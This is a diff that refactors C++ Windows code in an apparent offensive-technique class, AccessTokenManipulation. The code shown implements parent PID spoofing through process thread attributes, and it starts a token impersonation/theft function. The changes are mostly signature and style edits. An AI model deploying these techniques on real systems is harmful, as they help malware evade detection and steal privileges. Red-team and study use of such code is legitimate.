@@ -2,10 +2,10 @@
 
 namespace win {
 
-	DWORD SetPrivilege(HANDLE token_handle, std::wstring_view privilege_name, bool enable_privileg)
+	DWORD SetPrivilege(HANDLE token_handle, const std::wstring& privilege_name, bool enable_privileg)
 	{
-		TOKEN_PRIVILEGES token_privilege;
-		LUID luid;
+		TOKEN_PRIVILEGES token_privilege = {};
+		LUID luid = {};
 
 		if (!::LookupPrivilegeValueW(nullptr, privilege_name.data(), &luid)) {
 			return ::GetLastError();
@@ -27,8 +27,7 @@ namespace win {
 		return ERROR_SUCCESS;
 	}
 
-	DWORD AccessTokenManipulation::ParentPidSpoofing(DWORD parent_proc_infod, std::wstring_view process_path)
-	{
+	DWORD AccessTokenManipulation::ParentPidSpoofing(DWORD parent_proc_infod, const std::wstring& process_path){
 		SIZE_T size = 0;
 		PVOID buffer = nullptr;
 		STARTUPINFOEX start_info = { sizeof(start_info) };
@@ -36,26 +35,22 @@ namespace win {
 		HANDLE process_handle = nullptr;
 
 		process_handle = ::OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_proc_infod);
-		if (process_handle == nullptr)
-		{
+		if (process_handle == nullptr){
 			return ::GetLastError();
 		}
 
 		::InitializeProcThreadAttributeList(nullptr, 1, 0, &size);
-		if (size != 0)
-		{
+		if (size != 0){
 			buffer = ::malloc(size);
 
 			PPROC_THREAD_ATTRIBUTE_LIST attributes = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(buffer);
 
 			::InitializeProcThreadAttributeList(attributes, 1, 0, &size);
-			if (attributes != nullptr)
-			{
+			if (attributes != nullptr){
 				::UpdateProcThreadAttribute(attributes, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &process_handle, sizeof(process_handle), nullptr, nullptr);
 				start_info.lpAttributeList = attributes;
 
-				if (!::CreateProcessW(nullptr, const_cast<LPWSTR>(process_path.data()), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, reinterpret_cast<STARTUPINFO*>(&start_info), &proc_info))
-				{
+				if (!::CreateProcessW(nullptr, const_cast<LPWSTR>(process_path.data()), nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, nullptr, nullptr, reinterpret_cast<STARTUPINFO*>(&start_info), &proc_info)){
 					return ::GetLastError();
 				}
 
@@ -72,8 +67,7 @@ namespace win {
 		return ERROR_SUCCESS;
 	}
 
-	DWORD AccessTokenManipulation::TokenImpersonationTheft(DWORD target_pid, std::wstring_view create_process_name)
-	{
+	DWORD AccessTokenManipulation::TokenImpersonationTheft(DWORD target_pid, const std::wstring& create_process_name){
 		STARTUPINFOEX start_info = { sizeof(start_info) };
 		PROCESS_INFORMATION proc_info = { };
 		HANDLE current_token_handle = nullptr;
